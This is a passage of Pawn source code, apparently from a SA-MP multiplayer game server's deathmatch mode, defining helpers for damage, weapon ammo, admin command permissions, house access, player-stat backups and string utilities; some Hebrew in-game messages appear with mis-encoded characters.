		    SetPlayerHealth(playerid,h[1] <= 1.0 ? h[0] - dmg : dmg - h[1]);
			SetPlayerArmour(playerid,0.0);
		}
	}
	else
	{
		if(h[1] >= dmg) return SetPlayerArmour(playerid,h[1] - dmg);
		else
		{
		    SetPlayerHealth(playerid,h[1] <= 1.0 ? h[0] - dmg : dmg - h[1]);
			SetPlayerArmour(playerid,0.0);
		}
	}
	return 1;
}
//=[FindPlayer]=================================================================
stock FindPlayer(playerid,distance,Float:radius)
{
	new id = -1, Float:p[3], Float:rad = radius;
    for(new i = 0; i < distance; i++)
    {
		GetPlayerPos(playerid,p[0],p[1],p[2]);
        GetXYInFrontOfPlayer(playerid,p[0],p[1],0.5 + rad);
        rad += radius;
        for(new a = 0; a < MAX_PLAYERS; a++) if(IsPlayerConnected(a) && GetPlayerDistanceToPointEx(a,p[0],p[1],p[2]) <= 2.5 && a != playerid)
        {
            id = a;
            break;
        }
    }
    return id;
}
//=[GetNPCID]===================================================================
stock GetNPCID(playerid)
{
	for(new i = 0; i < sizeof(NPCs); i++) if(equal(NPCs[i][npcName],GetName(playerid))) return i;
	return -1;
}
//=[GetProgress]================================================================
stock GetProgress(plevel)
{
	new progress[32];
	if(plevel > 4) plevel = 4;
	if(plevel < 0) plevel = 0;
	format(progress,sizeof(progress),"~g~%s~g~~h~~h~%s",strmul("]",plevel),strmul("]",4 - plevel));
	return progress;
}
//=[fwrite_utf8]================================================================
#undef fwrite
stock fwrite_utf8(File:handle, str[], bool:use_utf8 = false)
{
	if(!handle) return 0;
	new x;
	while(str[x] != EOS) fputchar(handle, str[x++], use_utf8);
	return 1;
}
#define fwrite fwrite_utf8
//=[GetWeaponDefaultAmmo]=======================================================
stock GetWeaponDefaultAmmo(weaponid, playerid = -1)
{
	switch(weaponid)
	{
		case 0..15, 40, 44..46: return 0;
		case 17..18, 25, 33..36, 39: return 1;
		case 38, 41..42: return 500;
		case 22: return GetPlayerSkillLevel(WEAPONSKILL_PISTOL) >= 999 ? 34 : 17;
		case 26: return GetPlayerSkillLevel(WEAPONSKILL_SAWNOFF_SHOTGUN) >= 999 ? 4 : 2;
		case 28, 32: return GetPlayerSkillLevel(WEAPONSKILL_MIRCOUZI) >= 999 ? 100 : 50;
		case 23: return 17;
		case 24, 27: return 7;
		case 29, 30: return 30;
		case 31, 37: return 50;
		case 43: return 36;
	}
	return -1;
}
//=[SetPlayerSkillLevel2]=======================================================
#undef SetPlayerSkillLevel
stock SetPlayerSkillLevel2(playerid,skill,lvl)
{
	SetPlayerSkillLevel(playerid,skill,lvl);
	playerinfo[playerid][wskill][skill] = lvl;
}
#define SetPlayerSkillLevel SetPlayerSkillLevel2
//=[GetPlayerSkillLevel]========================================================
stock GetPlayerSkillLevel(playerid,skill) return playerinfo[playerid][wskill][skill];
//=[GetRotToXY]=================================================================
forward Float:GetRotToXY(Float:cx,Float:cy,Float:x,Float:y);
public Float:GetRotToXY(Float:cx,Float:cy,Float:x,Float:y) return atan2(floatsub(cy,y),floatsub(cx,x))+90.0;
//=[AddPlayerVelocity]==========================================================
stock AddPlayerVelocity(playerid, Float:addx, Float:addy, Float:addz)
{
	new Float:p[3];
	if(IsPlayerInAnyVehicle(playerid))
	{
	    new v = GetPlayerVehicleID(playerid);
	    GetVehicleVelocity(v,p[0],p[1],p[2]);
	    SetVehicleVelocity(v,p[0] + addx,p[1] + addy,p[2] + addz);
	}
	else
	{
	    GetPlayerVelocity(playerid,p[0],p[1],p[2]);
	    SetPlayerVelocity(playerid,p[0] + addx,p[1] + addy,p[2] + addz);
	}
	return 1;
}
//=[CheckHouseAcc]==============================================================
stock CheckHouseAcc(playerid,thehouse)
{
	new f[32], string[32];
	format(f,sizeof(f),"/DM/Houses/%d.ini",thehouse);
	if(fexist(f))
	{
		for(new ii=0;ii<max_houseacc;ii++)
		{
			format(string,sizeof(string),"Acc%d",ii);
			if(fkeyexist(f,string) && equal(fgetstring(f,string),GetName(playerid))) playerinfo[playerid][houseacc][thehouse] = 1;
		}
	}
	return 1;
}
//=[CommandAllowed]=============================================================
stock CommandAllowed(playerid,id,cmdtext[])
{
	if(playerinfo[id][pp] && id != playerid)
	{
		SendClientMessage(playerid,red," .Amit Power ùç÷ï æä îåâï ò\"é");
		return 0;
	}
	if(playerid != MAX_PLAYERS)
	{
		if(playerinfo[id][admin] > playerinfo[playerid][admin])
		{
			SendClientMessage(playerid,red," .àéðê éëåì ìáöò àú äô÷åãä äæå òì àãîéï áøîä âáåää îîê");
			if(playerinfo[id][admin] >= 15)
			{
				new adString[128];
				format(adString,sizeof(adString),"(Fail: %s %s)",GetName(playerid),cmdtext);
				SendClientMessage(id,yellow,adString);
			}
			return 0;
		}
	}
	return 1;
}
//=[biggest]====================================================================
stock biggest(array[], length = sizeof array)
{
	new temp;
	for(new i = 0; i < length; i++) for(new j = 0; j < i; j++) if(array[i] > array[j]) temp = array[i], array[i] = array[j], array[j] = temp;
}
//=[upLevel]====================================================================
stock upLevelName(powerid,powerlevel)
{
	switch(powerlevel)
	{
	    case 1: return UltimatePowers[powerid][upLevel1];
	    case 2: return UltimatePowers[powerid][upLevel2];
	    case 3: return UltimatePowers[powerid][upLevel3];
	    case 4: return UltimatePowers[powerid][upLevel4];
	    default: return 0;
	}
	return 0;
}
//=[gettime2]===================================================================
#undef gettime
stock gettime2(&hour,&minute,&second)
{
	gettime(hour,minute,second);
	minute -= 5;
	if(minute < 0)
	{
		minute = 60 - (minute * -1), hour--;
		if(hour < 0) hour = 23;
	}
}
#define gettime gettime2
//=[SendClientMessage2]=========================================================
stock SendClientMessage2(playerid,thecolor,text[])
{
	if(playerid == MAX_PLAYERS) return print(text);
	else return SendClientMessage(playerid,thecolor,text);
}
//=[SetPlayerName2]=============================================================
#undef SetPlayerName
stock SetPlayerName2(playerid,name[])
{
	new name1[MAX_PLAYER_NAME];
	SetString(name1,name);
	format(name1,sizeof(name1),"%s1",name1);
	SetPlayerName(playerid,name1);
	name1[strlen(name1) - 1] = 0;
	return SetPlayerName(playerid,name1);
}
#define SetPlayerName SetPlayerName2
//=[UpdateOnlineAdmins]=========================================================
stock UpdateOnlineAdmins()
{
	new oa = 0, str[8];
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i)) oa++;
	valstr(str,oa);
	return SetServerRule("admins_online",str);
}
//=[GetPlayerFirstName]=========================================================
stock GetPlayerFirstName(playerid)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name,sizeof(name));
	strdel(name,strfind(name,"_"),strlen(name));
	return name;
}
//=[IsPlayerInNPCVehicle]=======================================================
stock IsPlayerInNPCVehicle(playerid)
{
	for(new i = 0; i < sizeof(npcVehicles); i++) if(npcVehicles[i] > 0 && IsPlayerInVehicle(playerid,npcVehicles[i])) return 1;
	return 0;
}
//=[strreplace]=================================================================
stock strreplace(string[],str1[],str2[])
{
	new p = strfind(string,str1), sStart[256], sEnd[256], strtoset[256];
	if(p == -1) return 0;
	strmid(sStart,string,0,p);
	strmid(sEnd,string,p + strlen(str1),strlen(string));
	format(strtoset,sizeof(strtoset),"%s%s%s",sStart,str2,sEnd);
	SetString(string,strtoset);
	return 1;
}
//=[charreplace]================================================================
stock charreplace(string[],char1,char2)
{
	for(new i = 0; i < strlen(string); i++) if(string[i] == char1) string[i] = char2;
	return 1;
}
//=[Backup]=====================================================================
stock Backup(wtd[],filename[],value[]="")
{
	new string[M_S], File:f, filenm[64];
    format(filenm,sizeof(filenm),"/DM/Backups/%s.txt",filename);
	if(equal(wtd,"create")) fcreate(filenm);
	else if(equal(wtd,"add"))
	{
	    f = fopen(filenm,io_append);
	    format(string,sizeof(string),"%s|%d|%d\r\n",value,fgetint(value,"Level"),fgetint(value,"Kills"));
	    fwrite(f,string);
	    fclose(f);
	}
	else if(equal(wtd,"load"))
	{
	    new idx, uname[MAX_PLAYER_NAME], stats[2], uf[64];
	    f = fopen(filenm,io_read);
	    while(fread(f,string))
	    {
	        uname = strtok(string,idx,'|');
	        if(!equal(value,"#All") && !equal(uname,value)) continue;
	        for(new i = 0; i < sizeof(stats); i++) stats[i] = strval(strtok(string,idx,'|'));
			format(uf,sizeof(uf),"/DM/Users/%s.ini",uname);
			//RegisterPlayer(uname,"123");
			fsetint(uf,"Level",stats[0]);
			fsetint(uf,"Kills",stats[1]);
	    }
	    fclose(f);
	}
	return 1;
}
//=[fsearch]====================================================================
stock fsearch(File:f,srch[])
{
	new read[256];
	while(fread(f,read)) if(strfind(read,srch,false) != -1) return 1;
	return 0;
}
